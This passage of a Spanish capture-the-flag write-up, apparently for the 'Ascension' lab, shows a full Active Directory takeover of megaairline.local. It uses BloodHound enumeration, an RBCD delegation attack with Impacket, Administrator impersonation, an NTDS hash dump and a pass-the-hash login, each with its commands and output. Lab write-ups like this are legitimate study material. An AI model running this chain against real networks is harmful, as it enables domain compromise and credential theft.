❯ crackmapexec smb dc2.megaairline.local -u anna -p FWE**************d7f6dwx
SMB         megaairline.local 445    DC2              [*] Windows 10.0 Build 17763 x64 (name:DC2) (domain:megaairline.local) (signing:True) (SMBv1:False)  
SMB         megaairline.local 445    DC2              [+] megaairline.local\anna:FWErfsgt4ghd7f6dwx
```

Después de subir el archivo zip a Bloodhound, realizamos la enumeración partiendo del usuario "anna". Descubrimos que este usuario tiene privilegios de GenericAll sobre el equipo DC2, lo que significa que podría ser vulnerable a un ataque RBCD (Resource-Based Constrained Delegation). Este tipo de ataque puede ser llevado a cabo utilizando herramientas como Impacket, donde se crea una cuenta de equipo con "addcomputer" y luego se configura la delegación con "rbcd".

```bash
❯ bloodhound-python -u anna -p FWEr**************6dwx -ns 192.168.11.201 -d megaairline.local -c All --zip  
INFO: Found AD domain: megaairline.local
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc2.megaairline.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 4 computers
INFO: Connecting to LDAP server: dc2.megaairline.local
INFO: Found 12 users
INFO: Connecting to GC LDAP server: dc2.megaairline.local
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 1 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: MS01.megaairline.local
INFO: Querying computer: DC2.megaairline.local
INFO: Done in 00M 33S
INFO: Compressing output into 20230901014306_bloodhound.zip
```

```powershell
❯ impacket-addcomputer -computer-name attackersystem$ -computer-pass 123456 megaairline.local/anna:FWErfsgt4ghd7f6dwx
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Successfully added machine account attackersystem$ with password 123456.

❯ impacket-rbcd -delegate-from attackersystem$ -delegate-to DC2$ -action write megaairline.local/anna:FWErfsgt4ghd7f6dwx  
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] attackersystem$ can now impersonate users on DC2$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     attackersystem$   (S-1-5-21-775547830-308377188-957446042-9104)
```

Después de completar la delegación, el siguiente paso sería solicitar un ticket autenticándonos como el equipo creado ("attackersystem") suplantando al usuario "Administrator". Con este ticket, podríamos autenticarnos y conectarnos al DC utilizando "wmiexec".

Alternativamente, para mayor comodidad, podríamos utilizar "crackmapexec" para dumpear el NTDS (Active Directory Domain Services) y así obtener los hashes en formato NT de todos los usuarios y equipos asociados a este dominio.

```bash
❯ impacket-getST -spn cifs/dc2.megaairline.local megaairline.local/'attackersystem$':123456 -impersonate Administrator  
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Getting TGT for user
[*] Impersonating Administrator
[*] 	Requesting S4U2self
[*] 	Requesting S4U2Proxy
[*] Saving ticket in Administrator.ccache

❯ export KRB5CCNAME=Administrator.ccache
```

```powershell
❯ impacket-wmiexec dc2.megaairline.local -k -no-pass -shell-type powershell  
Impacket v0.11.0 - Copyright 2023 Fortra

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
PS C:\> whoami
megaairline\administrator

PS C:\>
```

```bash
❯ crackmapexec smb dc2.megaairline.local -k --use-kcache --ntds drsuapi
SMB         dc2.megaairline.local 445    DC2              [*] Windows 10.0 Build 17763 x64 (name:DC2) (domain:megaairline.local) (signing:True) (SMBv1:False)  
SMB         dc2.megaairline.local 445    DC2              [+] megaairline.local\Administrator from ccache (Pwn3d!)
SMB         dc2.megaairline.local 445    DC2              [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         dc2.megaairline.local 445    DC2              Administrator:500:aad3b435b514**************e:674f1a5c73f4faad8ddbf7f3bf86db60:::
SMB         dc2.megaairline.local 445    DC2              Guest:501:aad3b435b51404ee**************6ae931b73c59d7e0c089c0:::
SMB         dc2.megaairline.local 445    DC2              krbtgt:502:aad3b435b51404eeaad3b43**************b9e4ae8a97d001d:::
SMB         dc2.megaairline.local 445    DC2              megaairline.local\elliot:1108:aad3b4**************ee:74fdf381a94e1e446aaedf1757419dcd:::
SMB         dc2.megaairline.local 445    DC2              megaairline.local\anna:2101:aad3b435**************c7b3c5fe865d954d5b47013e21f:::
SMB         dc2.megaairline.local 445    DC2              megaairline.local\thomas:2601:aad3b4**************cc1edee80e4469d0cb118be53:::
SMB         dc2.megaairline.local 445    DC2              megaairline.local\pippa:2602:aad3b43**************e:f5b43ca4ad68bce5349f7cb4b3168e4e:::
SMB         dc2.megaairline.local 445    DC2              megaairline.local\angela:2603:aad3**************04ee:df36ca14e6d8a3d06b2c895895dbf48a:::
SMB         dc2.megaairline.local 445    DC2              megaairline.local\nigel:2604:aad3b**************:923ef4c82666a2116ac5deda0a6b2e52:::
SMB         dc2.megaairline.local 445    DC2              megaairline.local\kate:2605:aad3b43**************a4486fa23aeb1752503add2:::
SMB         dc2.megaairline.local 445    DC2              megaairline.local\emily:2606:aad3**************1404ee:24bfa93d0525c9f374467224de523a6f:::
SMB         dc2.megaairline.local 445    DC2              DC2$:1000:aad3b435b51404ee**************d67901176f6168d325d9ee3919e82:::
SMB         dc2.megaairline.local 445    DC2              MS01$:1106:aad3b435b51404e**************af44780749249ed6248f:::
SMB         dc2.megaairline.local 445    DC2              attackersystem$:9104:aad3b435**************ee:32ed87bdb5fdc5e9cba88547376818d4:::
SMB         dc2.megaairline.local 445    DC2              DAEDALUS$:1107:aad3b435b51404**************680a37bc4b11bc76657bc23341beffd6:::
```

Con el hash NT de Administrator en nuestro poder, podríamos conectarnos al DC2 utilizando "evil-winrm" y obtener una shell interactiva donde podríamos leer la flag.

```powershell
❯ evil-winrm -i dc2.megaairline.local -u Administrator -H 674f1a5**************f86db60  
PS C:\Users\Administrator\Documents> whoami
megaairline\administrator
PS C:\Users\Administrator\Documents> type ..\Desktop\flag.txt
ASCENSION{g0**************}
PS C:\Users\Administrator\Documents>
```
